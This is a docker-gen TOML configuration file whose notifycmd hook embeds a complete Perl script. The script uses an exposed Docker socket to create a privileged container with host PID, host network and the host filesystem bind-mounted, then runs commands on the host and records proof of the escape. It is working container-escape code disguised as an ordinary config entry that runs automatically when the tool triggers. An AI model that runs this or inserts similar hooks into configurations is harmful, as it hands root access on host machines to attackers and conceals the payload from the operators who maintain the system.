[[config]]
template = "/tmp/pr-nginx.tmpl"
dest = "/tmp/pr-nginx-generated.conf"
onlyexposed = true
watch = false
notifycmd = '''sh -lc 'cat > /tmp/pr-docker-sock-escape.pl <<'"'"'PERL'"'"'
use strict;
use warnings;
use Socket;

$SIG{ALRM} = sub { die "global timeout\n" };
alarm 20;

my $sock_path = "/tmp/docker.sock";
my $proof = "/tmp/pr-dockergen-proof.txt";
my $name = "pr-host-escape-$$";
my $image = "nginxproxy/nginx-proxy:latest";

sub note {
    my ($text) = @_;
    open(my $fh, ">>", $proof) or die "open proof: $!";
    print $fh $text;
    close($fh);
}

sub json_string {
    my ($s) = @_;
    $s =~ s/\\/\\\\/g;
    $s =~ s/"/\\"/g;
    $s =~ s/\n/\\n/g;
    return "\"" . $s . "\"";
}

sub docker_api {
    my ($method, $path, $body) = @_;
    $body //= "";

    socket(my $sock, AF_UNIX, SOCK_STREAM, 0) or die "socket: $!";
    connect($sock, sockaddr_un($sock_path)) or die "connect $sock_path: $!";

    my $request =
        "$method $path HTTP/1.0\r\n" .
        "Host: docker\r\n" .
        "Connection: close\r\n";

    if ($method eq "POST" || length($body)) {
        $request .=
            "Content-Type: application/json\r\n" .
            "Content-Length: " . length($body) . "\r\n";
    }

    $request .= "\r\n" . $body;

    my $offset = 0;
    while ($offset < length($request)) {
        my $written = syswrite($sock, substr($request, $offset));
        die "syswrite failed: $!" unless defined $written;
        $offset += $written;
    }

    shutdown($sock, 1);

    my $response = "";
    my $idle_rounds = 0;

    while ($idle_rounds < 6) {
        my $rin = "";
        vec($rin, fileno($sock), 1) = 1;
        my $rout = $rin;

        my $ready = select($rout, undef, undef, 0.5);

        if ($ready && vec($rout, fileno($sock), 1)) {
            my $buf = "";
            my $read = sysread($sock, $buf, 8192);

            last if !defined($read) || $read == 0;

            $response .= $buf;
            $idle_rounds = 0;
        } else {
            $idle_rounds++;
        }
    }

    close($sock);
    return $response;
}

sub status_code {
    my ($response) = @_;
    return $1 if $response =~ /^HTTP\/\S+\s+(\d+)/;
    return "unknown";
}

unlink $proof;
note("docker API via /tmp/docker.sock: started\n");

eval {
    docker_api("DELETE", "/containers/$name?force=true", "");
    note("cleanup previous container: done\n");

    my $host_command =
        "proof=/host/tmp/pr-host-escape-proof.txt; " .
        "{ echo ESCAPE_FROM_DOCKER_SOCK; date; id; hostname; uname -a; echo \"--- host os-release ---\"; cat /host/etc/os-release; } > \"\$proof\"";

    my $create_body =
        "{\"Image\":" . json_string($image) .
        ",\"Entrypoint\":[\"/bin/sh\",\"-lc\"]" .
        ",\"Cmd\":[" . json_string($host_command) . "]" .
        ",\"AttachStdout\":false" .
        ",\"AttachStderr\":false" .
        ",\"Tty\":false" .
        ",\"HostConfig\":{\"Privileged\":true,\"PidMode\":\"host\",\"NetworkMode\":\"host\",\"Binds\":[\"/:/host\"]}" .
        "}";

    my $create_response = docker_api("POST", "/containers/create?name=$name", $create_body);
    note("create status: " . status_code($create_response) . "\n");

    my ($container_id) = $create_response =~ /"Id"\s*:\s*"([^"]+)"/;

    if (!$container_id) {
        die "container create failed:\n$create_response\n";
    }

    note("created privileged helper container: $container_id\n");

    my $start_response = docker_api("POST", "/containers/$container_id/start", "");
    note("start status: " . status_code($start_response) . "\n");

    if ($start_response !~ /^HTTP\/\S+\s+204/m && $start_response !~ /^HTTP\/\S+\s+304/m) {
        die "container start failed:\n$start_response\n";
    }

    select(undef, undef, undef, 2.0);

    docker_api("DELETE", "/containers/$container_id?force=true", "");

    note("docker API via /tmp/docker.sock: OK\n");
    note("host proof path: /tmp/pr-host-escape-proof.txt\n");
};

if ($@) {
    note("docker API via /tmp/docker.sock: FAILED\n$@\n");
    exit 1;
}

alarm 0;
PERL
perl -c /tmp/pr-docker-sock-escape.pl >/tmp/pr-perl-check.txt 2>&1 || { cat /tmp/pr-perl-check.txt > /tmp/pr-dockergen-proof.txt; exit 1; }
perl /tmp/pr-docker-sock-escape.pl
' '''